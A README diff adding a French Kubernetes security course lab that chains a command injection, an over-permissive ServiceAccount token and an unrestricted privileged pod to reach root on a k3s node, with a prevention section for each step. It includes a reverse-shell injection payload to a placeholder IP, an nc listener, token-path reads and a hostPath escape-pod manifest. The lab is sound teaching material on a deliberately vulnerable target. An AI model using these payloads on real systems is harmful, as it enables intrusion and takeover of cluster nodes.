@@ -192,6 +192,140 @@ wait
 
 Résultat observé : CPU 2% → 501% → scale up **2 → 4 replicas** en ~30s. Ctrl+C pour arrêter.
 
+---
+
+## TP Kubernetes Security — Pentest
+
+Objectif : accéder au nœud k3s en root en enchaînant 3 vulnérabilités.
+
+### 1. Installation du workload vulnérable
+
+```bash
+git clone git@github.com:acombe/kubernetes-security-course.git
+cd kubernetes-security-course
+
+# Build + push (WSL sans accès internet depuis le container : utiliser docker-compose-host-network.yml)
+docker compose build
+docker compose push
+# Sur Windows : même contournement crane que pour flightbook
+
+kubectl create namespace infres
+kubectl apply -f k8s/Vulnnode.yaml
+
+sudo sh -c 'echo "$(hostname -I | awk '"'"'{print $1}'"'"') vulnnode.infres.fr" >> /etc/hosts'
+```
+
+Test : `http://vulnnode.infres.fr/lookup.html` → entrer `google.com` → résolution DNS affichée.
+
+![Formulaire vulnnode](docs/screens/vulnnode-01-form.png)
+![Résultat DNS google.com](docs/screens/vulnnode-02-dns-result.png)
+
+---
+
+### Vulnérabilité 1 — Command injection (étape 2)
+
+**Problème** : le formulaire passe l'input directement à `nslookup` via un `exec()` shell sans aucune sanitization.
+
+**Exploit** :
+```
+google.com ; bash -c 'exec bash -i &>/dev/tcp/TON_IP/4444 <&1'
+```
+
+![Injection dans le formulaire](docs/screens/vulnnode-04-injection.png)
+
+Écoute côté attaquant :
+```bash
+nc -lvnp 4444
+```
+Une fois le reverse shell obtenu, se connecter plus proprement :
+```bash
+kubectl exec -it vulnnode-<pod-id> -n infres -- /bin/bash
+```
+
+**Prévention** : ne jamais passer l'input utilisateur à un shell système. Utiliser une lib DNS haut niveau (`dns.lookup()` en Node, `dnspython` en Python) qui n'invoque pas de sous-processus.
+
+---
+
+### Vulnérabilité 2 — ServiceAccount trop permissif (étape 3)
+
+**Problème** : Kubernetes monte automatiquement un token ServiceAccount dans chaque pod (`/var/run/secrets/kubernetes.io/serviceaccount/token`). Le SA du pod a le droit `create pod` sur le cluster entier.
+
+**Exploit** :
+```bash
+# Depuis le pod
+ls /var/run/secrets/kubernetes.io/serviceaccount   # token, ca.crt, namespace
+
+cd /tmp
+curl -LO "https://dl.k8s.io/release/$(curl -Ls https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+chmod +x kubectl
+./kubectl auth can-i create pod   # → yes
+```
+
+![ServiceAccount — can-i create pod → yes](docs/screens/vulnnode-05-serviceaccount.png)
+
+**Prévention** : `automountServiceAccountToken: false` dans le Deployment si le pod n'en a pas besoin. Appliquer le principe de moindre privilège sur les ClusterRoles/RoleBindings.
+
+---
+
+### Vulnérabilité 3 — Aucun contrôle sur les pods privilégiés (étape 4)
+
+**Problème** : pas de `PodSecurity` admission controller — n'importe qui avec le droit `create pod` peut lancer un pod `privileged: true` qui monte le filesystem du nœud.
+
+**Exploit** : créer `escape.yaml` depuis le pod vulnnode avec le token SA récupéré :
+
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: cloud-escape-pod
+  namespace: infres
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+    - name: root-shell
+      image: alpine
+      command: ["sh"]
+      securityContext:
+        privileged: true
+      volumeMounts:
+        - name: host-root
+          mountPath: /host
+  volumes:
+    - name: host-root
+      hostPath:
+        path: /
+  restartPolicy: Never
+```
+
+```bash
+./kubectl apply -f escape.yaml
+./kubectl get pods -n infres   # cloud-escape-pod Running
+./kubectl exec -it cloud-escape-pod -n infres -- /bin/sh
+chroot /host
+whoami   # → root
+```
+
+![Escape pod → chroot → root sur le nœud](docs/screens/vulnnode-06-root.png)
+
+**Prévention** : activer le `PodSecurity` admission controller en mode `restricted` (standard Kubernetes depuis 1.25), ou OPA/Gatekeeper pour interdire explicitement `privileged: true`, `hostPath`, `hostNetwork/PID/IPC`.
+
+---
+
+### Résultat
+
+Root sur le nœud k3s via 3 vulnérabilités enchaînées :
+
+```
+Command injection dans le formulaire DNS
+→ shell dans le pod vulnnode
+→ token ServiceAccount trop permissif → kubectl create pod
+→ pod privilégié + hostPath mount → chroot /host → root sur le nœud
+```
+
+---
+
 ## Comptes
 
 | Utilisateur | Mot de passe | Rôle |
